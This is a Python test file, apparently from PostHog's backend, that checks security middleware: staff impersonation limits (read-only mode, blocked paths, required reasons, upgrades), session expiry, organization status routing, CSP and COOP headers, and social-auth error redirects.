        assert response.headers["Location"] == f"/admin/posthog/user/{self.other_user.id}/change/"

        # Verify we're back to original user
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email

    def test_read_only_impersonation_allows_set_current_organization(self):
        """Verify read-only impersonation allows PATCH with only set_current_organization."""
        self.login_as_other_user_read_only()

        response = self.client.patch(
            "/api/users/@me/",
            data={"set_current_organization": str(self.organization.id)},
            content_type="application/json",
        )

        assert response.status_code == 200

    def test_read_only_impersonation_blocks_set_current_organization_with_other_fields(
        self,
    ):
        """Verify read-only impersonation blocks PATCH with set_current_organization plus other fields."""
        self.login_as_other_user_read_only()

        response = self.client.patch(
            "/api/users/@me/",
            data={
                "set_current_organization": str(self.organization.id),
                "first_name": "Hacked",
            },
            content_type="application/json",
        )

        assert response.status_code == 403
        assert response.json()["code"] == "impersonation_read_only"


@override_settings(IMPERSONATION_TIMEOUT_SECONDS=100)
@override_settings(IMPERSONATION_IDLE_TIMEOUT_SECONDS=20)
@override_settings(ADMIN_PORTAL_ENABLED=True)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_KEY=None)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_SECRET=None)
# Bypass ManifestStaticFilesStorage so admin templates render in tests without a manifest.
@override_settings(STORAGES={"staticfiles": {"BACKEND": "django.contrib.staticfiles.storage.StaticFilesStorage"}})
class TestAdminImpersonationMiddleware(APIBaseTest):
    """Tests AdminImpersonationMiddleware: admin panel must remain accessible to the
    original staff user during impersonation, even though `request.user` would
    normally be the (non-staff) impersonated customer."""

    other_user: User

    def setUp(self):
        super().setUp()
        self.other_user = User.objects.create_and_join(
            self.organization, email="other-user@posthog.com", password="123456"
        )
        self.user.is_staff = True
        self.user.save()

        # Use Django's standard Client because the loginas admin view expects
        # form-encoded POST data (APIClient defaults to JSON).
        self.client = cast(Any, DjangoClient())
        self.client.force_login(self.user)

    def login_as_other_user(self):
        # Don't `follow=True` — the post-loginas redirect lands on `/` which renders
        # the frontend's index.html (not present in tests).
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "false", "reason": "Test impersonation"},
        )

    def test_admin_index_accessible_during_impersonation(self):
        """The admin index must respond 200, not redirect to /admin/login/, during impersonation."""
        self.login_as_other_user()

        # API confirms we're impersonating
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        response = self.client.get("/admin/")
        assert response.status_code == 200
        # Banner should be rendered with the impersonated user
        assert b"other-user@posthog.com" in response.content

    def test_admin_index_redirects_when_no_impersonation_and_not_staff(self):
        """Sanity check: a non-staff user without impersonation still cannot access /admin/."""
        self.user.is_staff = False
        self.user.save()

        response = self.client.get("/admin/")
        # Django redirects to /admin/login/ for unauthorized requests
        assert response.status_code == 302
        assert "/admin/login" in response.headers.get("Location", "")

    def test_non_admin_paths_still_use_impersonated_user(self):
        """Outside of /admin/, the impersonated user must remain in effect."""
        self.login_as_other_user()

        response = self.client.get("/api/users/@me/")
        assert response.status_code == 200
        assert response.json()["email"] == "other-user@posthog.com"

    def test_admin_logout_still_sees_impersonated_user(self):
        """/admin/logout/ must keep the impersonated user as request.user so it can
        redirect back to that user's admin change page."""
        self.login_as_other_user()

        response = self.client.get("/admin/logout/")
        assert response.status_code == 302
        assert response.headers["Location"] == f"/admin/posthog/user/{self.other_user.id}/change/"

    def test_admin_unaffected_when_not_impersonating(self):
        """Regular staff users without an impersonation session still access admin normally."""
        response = self.client.get("/admin/")
        assert response.status_code == 200

    def login_as_other_user_read_only(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "true", "reason": "Test read-only impersonation"},
        )

    @patch("posthog.views.get_client")
    def test_admin_writes_allowed_during_read_only_impersonation(self, mock_get_client: MagicMock):
        """Admin POST/PATCH/DELETE actions must not be blocked by the read-only
        impersonation middleware — admin runs as the original staff user."""
        mock_redis = MagicMock()
        mock_redis.ttl.return_value = -1
        mock_get_client.return_value = mock_redis

        self.login_as_other_user_read_only()

        # POST to /admin/redis/edit-ttl — a function-based admin view registered directly
        # in the URLconf (not lazy-loaded), so it's reachable in tests. A successful POST
        # redirects (302) to the redis values list.
        response = self.client.post(
            "/admin/redis/edit-ttl",
            data={"key": "test:key", "ttl_seconds": "60"},
        )

        # Endpoint must be reached (would-be 404 means the test isn't proving anything).
        assert response.status_code != 404, "admin URL not registered in test environment"
        # Middleware must not return its read-only 403.
        assert response.status_code != 403, f"unexpected 403: {response.content!r}"
        # Sanity check the write actually happened.
        mock_redis.expire.assert_called_once_with("test:key", 60)

    def test_api_writes_still_blocked_during_read_only_impersonation(self):
        """Non-admin write requests must still be blocked under read-only impersonation."""
        from products.dashboards.backend.models.dashboard import Dashboard

        dashboard = Dashboard.objects.create(team=self.team, name="Test Dashboard")
        self.login_as_other_user_read_only()

        response = self.client.delete(f"/api/projects/{self.team.id}/dashboards/{dashboard.id}/")
        assert response.status_code == 403
        assert response.json()["code"] == "impersonation_read_only"

    def test_admin_blocked_when_original_user_loses_staff(self):
        """If the original (impersonator) user is no longer staff, admin access is denied."""
        self.login_as_other_user()

        # Demote the original user mid-session.
        self.user.is_staff = False
        self.user.save()

        response = self.client.get("/admin/")
        # No swap happens (original isn't staff anymore) → impersonated non-staff user blocked
        assert response.status_code == 302
        assert "/admin/login" in response.headers.get("Location", "")


@override_settings(IMPERSONATION_TIMEOUT_SECONDS=100)
@override_settings(IMPERSONATION_IDLE_TIMEOUT_SECONDS=20)
@override_settings(ADMIN_PORTAL_ENABLED=True)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_KEY=None)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_SECRET=None)
class TestImpersonationBlockedPathsMiddleware(APIBaseTest):
    other_user: User

    def setUp(self):
        super().setUp()
        self.other_user = User.objects.create_and_join(
            self.organization, email="other-user@posthog.com", password="123456"
        )
        self.user.is_staff = True
        self.user.save()

        # Use Django's standard Client instead of APIClient for these tests.
        # The loginas admin view expects form-encoded POST data, which is
        # Django Client's default (APIClient defaults to JSON).
        self.client = cast(Any, DjangoClient())
        self.client.force_login(self.user)

    def login_as_other_user(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "false", "reason": "Test impersonation"},
            follow=True,
        )

    def test_impersonation_allows_get_to_users_api(self):
        """Verify impersonation allows GET requests to /api/users/."""
        self.login_as_other_user()

        response = self.client.get("/api/users/@me/")
        assert response.status_code == 200
        assert response.json()["email"] == "other-user@posthog.com"

    def test_impersonation_blocks_patch_to_users_api(self):
        """Verify any impersonation blocks PATCH requests to /api/users/."""
        self.login_as_other_user()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me/").json()["email"] == "other-user@posthog.com"

        # Try to update user
        response = self.client.patch(
            "/api/users/@me/",
            data={"first_name": "Changed"},
            content_type="application/json",
        )

        assert response.status_code == 403
        response_data = response.json()
        assert response_data["type"] == "authentication_error"
        assert response_data["code"] == "impersonation_path_blocked"

    def test_non_impersonated_session_can_patch_users_api(self):
        """Verify non-impersonated sessions can PATCH /api/users/."""
        response = self.client.patch(
            "/api/users/@me/",
            data={"first_name": "Updated"},
            content_type="application/json",
        )

        assert response.status_code == 200
        self.user.refresh_from_db()
        assert self.user.first_name == "Updated"

    def test_impersonation_allows_set_current_organization(self):
        """Verify impersonation allows PATCH with only set_current_organization."""
        self.login_as_other_user()

        response = self.client.patch(
            "/api/users/@me/",
            data={"set_current_organization": str(self.organization.id)},
            content_type="application/json",
        )

        assert response.status_code == 200

    def test_impersonation_blocks_set_current_organization_with_other_fields(self):
        """Verify impersonation blocks PATCH with set_current_organization plus other fields."""
        self.login_as_other_user()

        response = self.client.patch(
            "/api/users/@me/",
            data={
                "set_current_organization": str(self.organization.id),
                "first_name": "Hacked",
            },
            content_type="application/json",
        )

        assert response.status_code == 403
        assert response.json()["code"] == "impersonation_path_blocked"

    def test_impersonation_allows_get_to_personal_api_keys(self):
        """Verify impersonation allows GET requests to /api/personal_api_keys/."""
        self.login_as_other_user()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me/").json()["email"] == "other-user@posthog.com"

        response = self.client.get("/api/personal_api_keys/")
        assert response.status_code == 200

    def test_impersonation_blocks_post_to_personal_api_keys(self):
        """Verify any impersonation blocks POST requests to /api/personal_api_keys/."""
        self.login_as_other_user()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me/").json()["email"] == "other-user@posthog.com"

        response = self.client.post(
            "/api/personal_api_keys/",
            data={"label": "Test Key"},
            content_type="application/json",
        )

        assert response.status_code == 403
        response_data = response.json()
        assert response_data["type"] == "authentication_error"
        assert response_data["code"] == "impersonation_path_blocked"


@override_settings(ADMIN_PORTAL_ENABLED=True)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_KEY=None)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_SECRET=None)
class TestImpersonationLoginReasonRequired(APIBaseTest):
    other_user: User

    def setUp(self):
        super().setUp()
        self.other_user = User.objects.create_and_join(
            self.organization, email="other-user@posthog.com", password="123456"
        )
        self.user.is_staff = True
        self.user.save()

        self.client = cast(Any, DjangoClient())
        self.client.force_login(self.user)

    def test_impersonation_rejected_without_reason(self):
        """Verify impersonation is rejected when no reason is provided."""
        self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "true"},
            follow=True,
        )

        # Should still be logged in as original staff user (impersonation rejected)
        assert self.client.get("/api/users/@me/").json()["email"] == self.user.email

    def test_impersonation_succeeds_with_reason(self):
        """Verify impersonation succeeds when a reason is provided."""
        self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "true", "reason": "Investigating support ticket #1234"},
            follow=True,
        )

        # Should now be logged in as other user
        assert self.client.get("/api/users/@me/").json()["email"] == "other-user@posthog.com"

    def test_impersonation_rejected_with_empty_reason(self):
        """Verify impersonation is rejected when reason is empty string."""
        self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "true", "reason": ""},
            follow=True,
        )

        # Should still be logged in as original staff user
        assert self.client.get("/api/users/@me/").json()["email"] == self.user.email

    def test_impersonation_rejected_with_whitespace_only_reason(self):
        """Verify impersonation is rejected when reason is only whitespace."""
        self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "true", "reason": "   "},
            follow=True,
        )

        # Should still be logged in as original staff user
        assert self.client.get("/api/users/@me/").json()["email"] == self.user.email


class TestUpgradeImpersonation(APIBaseTest):
    other_user: User

    def setUp(self):
        super().setUp()
        self.other_user = User.objects.create_and_join(
            self.organization, email="other-user@posthog.com", password="123456"
        )
        self.user.is_staff = True
        self.user.save()

        self.client = cast(Any, DjangoClient())
        self.client.force_login(self.user)

    def login_as_read_only(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "true", "reason": "Initial read-only impersonation"},
            follow=True,
        )

    def login_as_read_write(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "false", "reason": "Initial read-write impersonation"},
            follow=True,
        )

    def test_upgrade_succeeds_from_read_only_with_reason(self):
        self.login_as_read_only()

        # Verify we're in read-only mode
        user_response = self.client.get("/api/users/@me/")
        assert user_response.json()["is_impersonated_read_only"] is True

        # Upgrade to read-write
        response = self.client.post(
            reverse("impersonation-upgrade"),
            data=json.dumps({"reason": "Need to make changes for support ticket #5678"}),
            content_type="application/json",
        )
        assert response.status_code == 200
        assert response.json()["success"] is True

        # Verify we're now in read-write mode
        user_response = self.client.get("/api/users/@me/")
        assert user_response.json()["is_impersonated_read_only"] is False

    def test_upgrade_returns_404_when_not_impersonated(self):
        response = self.client.post(
            reverse("impersonation-upgrade"),
            data=json.dumps({"reason": "Some reason"}),
            content_type="application/json",
        )
        assert response.status_code == 404

    def test_upgrade_returns_404_when_already_read_write(self):
        self.login_as_read_write()

        response = self.client.post(
            reverse("impersonation-upgrade"),
            data=json.dumps({"reason": "Some reason"}),
            content_type="application/json",
        )
        assert response.status_code == 404

    def test_upgrade_returns_400_without_reason(self):
        self.login_as_read_only()

        response = self.client.post(
            reverse("impersonation-upgrade"),
            data=json.dumps({}),
            content_type="application/json",
        )
        assert response.status_code == 400
        assert "reason" in response.json()["error"].lower()

    def test_upgrade_returns_400_with_empty_reason(self):
        self.login_as_read_only()

        response = self.client.post(
            reverse("impersonation-upgrade"),
            data=json.dumps({"reason": "   "}),
            content_type="application/json",
        )
        assert response.status_code == 400

    @patch("ee.admin.loginas_views.get_original_user_from_session", return_value=None)
    def test_upgrade_returns_400_when_staff_user_not_found(self, mock_get_staff):
        self.login_as_read_only()

        response = self.client.post(
            reverse("impersonation-upgrade"),
            data=json.dumps({"reason": "Some reason"}),
            content_type="application/json",
        )
        assert response.status_code == 400
        assert response.json()["error"] == "Unable to upgrade impersonation"

    def test_upgrade_returns_400_when_staff_demoted_mid_session(self):
        self.login_as_read_only()

        # Revoke staff privileges mid-session
        self.user.is_staff = False
        self.user.save()

        response = self.client.post(
            reverse("impersonation-upgrade"),
            data=json.dumps({"reason": "Some reason"}),
            content_type="application/json",
        )
        assert response.status_code == 400
        assert response.json()["error"] == "Unable to upgrade impersonation"


@override_settings(SESSION_COOKIE_AGE=100)
class TestSessionAgeMiddleware(APIBaseTest):
    def setUp(self):
        super().setUp()
        cache.clear()
        # Patch time.time before login to ensure session creation time is correct
        self.time_patcher = patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
        self.time_patcher.start()
        self.client.force_login(self.user)
        self.time_patcher.stop()

    def tearDown(self):
        super().tearDown()
        cache.clear()
        # Ensure any remaining patches are stopped
        self.time_patcher.stop()

    @freeze_time("2024-01-01 12:00:00")
    @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
    def test_session_continues_when_not_expired(self, mock_time):
        # Initial request sets session creation time
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(
            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
            1704110400.0,
        )

        # Move forward 99 seconds (before timeout)
        mock_time.return_value = 1704110499.0  # 2024-01-01 12:01:39
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)

    @freeze_time("2024-01-01 12:00:00")
    @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
    def test_session_expires_after_total_time(self, mock_time):
        # Initial request sets session creation time
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(
            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
            1704110400.0,
        )

        # Move forward past total session age (101 seconds)
        mock_time.return_value = 1704110501.0  # 2024-01-01 12:01:41
        response = self.client.get("/")
        # Should redirect to login
        self.assertEqual(response.status_code, 302)
        self.assertEqual(
            response.headers["Location"],
            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
        )

    @freeze_time("2024-01-01 12:00:00")
    @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
    def test_org_specific_session_timeout_from_cache(self, mock_time):
        # Set org-specific timeout in cache
        cache.set(f"org_session_age:{self.organization.id}", 50)

        # Initial request sets session creation time
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(
            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
            1704110400.0,
        )

        # Move forward past org timeout (51 seconds)
        mock_time.return_value = 1704110451.0  # 2024-01-01 12:00:51
        response = self.client.get("/")
        # Should redirect to login
        self.assertEqual(response.status_code, 302)
        self.assertEqual(
            response.headers["Location"],
            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
        )

    @freeze_time("2024-01-01 12:00:00")
    @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
    def test_session_timeout_after_switching_org_with_cache(self, mock_time):
        # Create another org with different timeout
        other_org = Organization.objects.create(name="Other Org", session_cookie_age=30)
        other_team = Team.objects.create(organization=other_org, name="Other Team")
        self.user.organizations.add(other_org)

        # Set cache for both orgs
        cache.set(f"org_session_age:{self.organization.id}", 50)
        cache.set(f"org_session_age:{other_org.id}", 30)

        # Initial request sets session creation time
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(
            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
            1704110400.0,
        )

        # Switch to other team
        self.user.team = other_team
        self.user.current_team = other_team
        self.user.current_organization = other_org
        self.user.save()

        # Move forward 29 seconds (before new org's timeout)
        mock_time.return_value = 1704110429.0  # 2024-01-01 12:00:29
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)

        # Move forward 31 seconds (past new org's timeout)
        mock_time.return_value = 1704110431.0  # 2024-01-01 12:00:31
        response = self.client.get("/")
        self.assertEqual(response.status_code, 302)
        self.assertEqual(
            response.headers["Location"],
            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
        )


class TestActiveOrganizationMiddleware(APIBaseTest):
    def test_active_organization_allows_request(self):
        self.organization.is_active = True
        self.organization.save()

        # API paths are skipped by middleware
        response = self.client.get("/api/users/@me/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(response.json()["email"], self.user.email)

        # Non-API paths are checked
        response = self.client.get("/dashboard")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

    def test_api_paths_skipped_even_with_inactive_org(self):
        """API paths should be skipped by middleware regardless of org status"""
        self.organization.is_active = False
        self.organization.is_not_active_reason = "Test deactivation"
        self.organization.save()

        # API paths should work even with inactive org
        response = self.client.get("/api/users/@me/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

    def test_inactive_organization_redirects_non_api_paths(self):
        other_org = Organization.objects.create(name="Other Org", is_active=True)
        self.user.organizations.add(other_org)

        self.organization.is_active = False
        self.organization.is_not_active_reason = "Test deactivation"
        self.organization.save()

        # Non-API paths should redirect
        response = self.client.get("/dashboard")
        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
        self.assertEqual(response.headers["Location"], "/organization-deactivated")

    def test_inactive_organization_allows_organization_deactivated_page(self):
        self.organization.is_active = False
        self.organization.is_not_active_reason = "Test deactivation"
        self.organization.save()

        # Should allow access to the deactivated page itself
        response = self.client.get("/organization-deactivated")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

    def test_logout_path_skipped(self):
        """Logout paths should be skipped by middleware"""
        self.organization.is_active = False
        self.organization.save()

        response = self.client.post("/logout/")
        # Logout may redirect (302 is normal), but should not redirect to organization-deactivated
        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
        self.assertNotIn("organization-deactivated", response.headers.get("Location", ""))

    def test_unauthenticated_user_not_affected(self):
        self.client.logout()
        # API paths are skipped, so auth check happens in view
        response = self.client.get("/api/users/@me/")
        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)

        # Non-API paths are also skipped for unauthenticated users
        response = self.client.get("/dashboard")
        # Should redirect to login or show appropriate response
        self.assertIn(response.status_code, [status.HTTP_302_FOUND, status.HTTP_200_OK])

    @parameterized.expand(
        [
            ("/dashboard", status.HTTP_302_FOUND, "/organization-pending-deletion"),
            ("/some-page", status.HTTP_302_FOUND, "/organization-pending-deletion"),
            ("/organization-pending-deletion", status.HTTP_200_OK, None),
            ("/api/users/@me/", status.HTTP_200_OK, None),
        ]
    )
    def test_pending_deletion_routing(self, path, expected_status, expected_location):
        self.organization.is_pending_deletion = True
        self.organization.save()

        response = self.client.get(path)
        self.assertEqual(response.status_code, expected_status)
        if expected_location:
            self.assertEqual(response.headers["Location"], expected_location)


class TestActivityLoggingMiddleware(APIBaseTest):
    def setUp(self):
        super().setUp()
        from django.test import RequestFactory

        from posthog.middleware import ActivityLoggingMiddleware
        from posthog.models.activity_logging.utils import activity_storage

        self.activity_storage = activity_storage
        self.factory = RequestFactory()
        self.captured: dict[str, Any] = {}

        def get_response(request):
            self.captured["client"] = activity_storage.get_client()
            self.captured["user"] = activity_storage.get_user()
            from django.http import HttpResponse

            return HttpResponse()

        self.middleware = ActivityLoggingMiddleware(get_response)

    def test_captures_x_posthog_client_header(self):
        request = self.factory.get("/", HTTP_X_POSTHOG_CLIENT="posthog-js/1.234.0")
        request.user = self.user
        self.middleware(request)
        self.assertEqual(self.captured["client"], "posthog-js/1.234.0")
        # Storage is cleared after the request finishes
        self.assertIsNone(self.activity_storage.get_client())

    def test_missing_header_leaves_client_unset(self):
        request = self.factory.get("/")
        request.user = self.user
        self.middleware(request)
        self.assertIsNone(self.captured["client"])

    def test_long_header_value_is_truncated(self):
        from posthog.models.activity_logging.utils import ACTIVITY_LOG_CLIENT_MAX_LENGTH

        long_value = "x" * (ACTIVITY_LOG_CLIENT_MAX_LENGTH * 4)
        request = self.factory.get("/", HTTP_X_POSTHOG_CLIENT=long_value)
        request.user = self.user
        self.middleware(request)
        self.assertEqual(self.captured["client"], "x" * ACTIVITY_LOG_CLIENT_MAX_LENGTH)


class TestCSPMiddleware(APIBaseTest):
    def test_non_html_response_gets_strict_csp(self):
        response = self.client.get("/api/users/@me/")
        assert response.status_code == 200
        assert response["Content-Security-Policy"] == "default-src 'none'"
        assert "Content-Security-Policy-Report-Only" not in response

    def test_html_response_gets_report_only_csp(self):
        response = self.client.get("/")
        assert response.status_code == 200
        assert "Content-Security-Policy-Report-Only" in response
        assert "Content-Security-Policy" not in response


class TestSocialAuthExceptionMiddleware(APIBaseTest):
    CONFIG_AUTO_LOGIN = False

    def setUp(self):
        super().setUp()
        from django.test import RequestFactory

        from posthog.middleware import SocialAuthExceptionMiddleware

        self.middleware = SocialAuthExceptionMiddleware(lambda request: None)
        self.factory = RequestFactory()

    @parameterized.expand(
        [
            (
                "oauth_cancelled_on_complete",
                "/complete/google-oauth2/",
                AuthCanceled(_social_auth_backend(), "User cancelled"),
                "/login?error_code=oauth_cancelled",
            ),
            (
                "saml_sso_enforced",
                "/complete/saml/",
                AuthFailed(_social_auth_backend(), "saml_sso_enforced"),
                "/login?error_code=saml_sso_enforced",
            ),
            (
                "google_sso_enforced",
                "/complete/google-oauth2/",
                AuthFailed(_social_auth_backend(), "google_sso_enforced"),
                "/login?error_code=google_sso_enforced",
            ),
            (
                "github_sso_enforced",
                "/complete/github/",
                AuthFailed(_social_auth_backend(), "github_sso_enforced"),
                "/login?error_code=github_sso_enforced",
            ),
            (
                "gitlab_sso_enforced",
                "/complete/gitlab/",
                AuthFailed(_social_auth_backend(), "gitlab_sso_enforced"),
                "/login?error_code=gitlab_sso_enforced",
            ),
            (
                "generic_sso_enforced",
                "/complete/saml/",
                AuthFailed(_social_auth_backend(), "sso_enforced"),
                "/login?error_code=sso_enforced",
            ),
        ]
    )
    def test_redirects_with_expected_url(self, _name, path, exception, expected_url):
        request = self.factory.get(path)
        response = self.middleware.process_exception(request, exception)

        self.assertIsNotNone(response)
        assert isinstance(response, HttpResponseRedirect)
        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
        self.assertEqual(response.url, expected_url)

    @parameterized.expand(
        [
            (
                "auth_failed_generic_on_complete",
                "/complete/saml/",
                AuthFailed(_social_auth_backend(), "SAML not configured for this user."),
            ),
            (
                "auth_missing_parameter_on_complete",
                "/complete/saml/",
                AuthMissingParameter(_social_auth_backend(), "email"),
            ),
            (
                "auth_failed_on_login_path",
                "/login/saml/",
                AuthFailed(_social_auth_backend(), "SAML not configured for this user."),
            ),
        ]
    )
    def test_redirects_with_social_login_failure(self, _name, path, exception):
        from urllib.parse import parse_qs, urlparse

        request = self.factory.get(path)
        response = self.middleware.process_exception(request, exception)

        self.assertIsNotNone(response)
        assert isinstance(response, HttpResponseRedirect)
        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
        self.assertIn("error_code=social_login_failure", response.url)
        self.assertIn("error_detail=", response.url)

        parsed = urlparse(response.url)
        error_detail = parse_qs(parsed.query).get("error_detail", [""])[0]
        if isinstance(exception, AuthFailed):
            self.assertFalse(error_detail.startswith("Authentication failed: "))

    @parameterized.expand(
        [
            (
                "non_auth_exception_on_oauth_path",
                "/complete/saml/",
                ValueError("some random error"),
            ),
            (
                "auth_failed_on_non_oauth_path",
                "/api/some-endpoint/",
                AuthFailed(_social_auth_backend(), "some error"),
            ),
        ]
    )
    def test_returns_none_for_unhandled_cases(self, _name, path, exception):
        request = self.factory.get(path)
        response = self.middleware.process_exception(request, exception)

        self.assertIsNone(response)


@pytest.mark.parametrize(
    "path,query_string,expected_coop",
    [
        ("/connect/vercel/link", "", "unsafe-none"),
        ("/oauth/callback", "", "unsafe-none"),
        ("/login", "next=/connect/vercel/link", "unsafe-none"),
        ("/login", "next=/connect/vercel/link?session=abc", "unsafe-none"),
        ("/login", "", "same-origin"),
        ("/login", "next=/dashboard", "same-origin"),
        ("/login", "next=/connect/vercel/../../admin", "same-origin"),
        ("/some/other/path", "", "same-origin"),
    ],
    ids=[
        "direct-oauth-vercel",
        "direct-oauth-callback",
        "login-next-oauth",
        "login-next-oauth-with-params",
        "login-no-next",
        "login-next-non-oauth",
        "login-next-path-traversal",
        "unrelated-path",
    ],
)
def test_oauth_coop_middleware(path, query_string, expected_coop):
    from django.http import HttpResponse
    from django.test import RequestFactory

    from posthog.middleware import OAuthCoopMiddleware

    factory = RequestFactory()
    request = factory.get(path + ("?" + query_string if query_string else ""))

    def get_response(req):
        resp = HttpResponse("ok")
        resp["Cross-Origin-Opener-Policy"] = "same-origin"
        return resp

    middleware = OAuthCoopMiddleware(get_response)
    response = middleware(request)
    assert response["Cross-Origin-Opener-Policy"] == expected_coop


@parameterized.expand(
    [
        ("posthog/mcp-server v1", "mcp", "mcp", "query"),
        ("Mozilla/5.0", "web", None, None),
        ("posthog/code", "posthog_code", None, None),
    ]
)
def test_chqueries_middleware_mcp_defaults(user_agent, expected_source, expected_product, expected_feature):
    from django.http import HttpResponse
    from django.test import RequestFactory

    from posthog.clickhouse.query_tagging import get_query_tags
    from posthog.middleware import CHQueries

    captured: dict = {}

    def get_response(req):
        tags = get_query_tags()
        captured["source"] = tags.source
        captured["product"] = tags.product
        captured["feature"] = tags.feature
        return HttpResponse("ok")

    factory = RequestFactory()
    request = factory.get("/api/projects/@current/query/", HTTP_USER_AGENT=user_agent)
    request.user = MagicMock(pk=1, is_authenticated=False)
    request.session = MagicMock(session_key="abc123")

    CHQueries(get_response)(request)

    assert captured["source"] == expected_source
    assert captured["product"] == expected_product
    assert captured["feature"] == expected_feature


def test_query_time_counting_middleware_emits_durations_in_milliseconds() -> None:
    from posthog.middleware import QueryTimeCountingMiddleware

    middleware = QueryTimeCountingMiddleware(get_response=lambda r: None)
    header = middleware._construct_header(
        durations_ms={"django": 2050.4, "pg": 1490.6, "pg_max": 1200.0, "ch": 0.0, "ch_max": 0.0},
        counts={"pg_count": 17, "pg_slow": 2, "ch_count": 0, "ch_slow": 0},
    )

    assert "django;dur=2050" in header
    assert "pg;dur=1491" in header
    assert "pg_max;dur=1200" in header
    assert 'pg_count;desc="17"' in header
    assert 'pg_slow;desc="2"' in header
